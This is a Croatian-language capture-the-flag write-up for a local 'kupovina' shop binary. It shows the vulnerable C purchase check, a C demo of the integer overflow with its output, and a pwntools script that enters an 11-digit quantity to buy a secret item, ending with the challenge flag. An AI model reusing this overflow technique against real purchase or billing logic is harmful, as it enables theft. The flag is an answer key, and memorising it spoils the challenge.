# Writeup

Detaljnom analizom izvornog koda programa, uočena je potencijalna ranjivost programa **integer overflow** kod kupovine stvari. 

Isječak koda koji sadrži ranjivost:
```
if(dostupneStvari[opcija-1].cijena * kolicina <= novac){
		novac-= dostupneStvari[opcija-1].cijena;
		printf("Kupljeno: %s (%dx)\n", dostupneStvari[opcija-1].ime,kolicina);
		
		if(opcija-1 == 4){
			tajnaStvarKupljena();
		}
		
		return;
}
```
Kako bi izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` bio istinit, može se za količinu stvari _Super tajna stvar_ unijeti jako veliki broj koji će zbog integer overflow-a zadovoljiti izraz.

Izrađen je program koji za količinu uzima broj ```99999999999``` i pomnožimo ga s cijenom stvari _Super tajna stvar_:
```#include "stdio.h"
int main()
{
    int kolicina = 99999999999;
    int cijena = 2232350;
    printf("Kolicina = %d\n", kolicina);
    printf("cijenaijena = %d\n", cijena);
    printf("Umnozak = %d\n", kolicina*cijena);

    return 0;
}
```

Izlaz programa je:
```
Kolicina = 1215752191
cijenaijena = 2232350
Umnozak = -1135796254
```

Izraz ```dostupneStvari[opcija-1].cijena * kolicina <= novac``` postaje ```-1135796254 <= novac```. Pošto je ```novac``` uvijek veći ili jednak nuli, izraz postaje istinit.



Rješenje:
```
from pwn import *

io = process("./kupovina") #da možemo slati i primati podatke od procesa
elf = ELF("./kupovina") #omogućava pwn tools da može pročitati gdje su adrese funkcija

# = = = START

print(io.recvuntil(b"Odabir:")) #pricekaj ovaj output
#b ispred stringa veli pythonu da on to tretiura kao bytove, jer python ima neke druge UTF-8 stringove

io.sendline(b"3") #biranje opcije 3

print(io.recvuntil(b"Odaberite stvar koju zelite kupiti (0 za izlaz):")) 
io.sendline(b"5") #biranje opcije 3

payload = b""
payload += b"9" * 11

# = = = END

io.sendline(payload) #slanje exploita
print(payload)

io.interactive(); #prebacuje stdin i stdout na standardni ulaz i izlaz, vraća kontrolu korisniku (terminalu)

```


Pokretanjem ove skripte, ispiše se flag ```CTFFOI[1nt3ger_0VERFL0W]```.
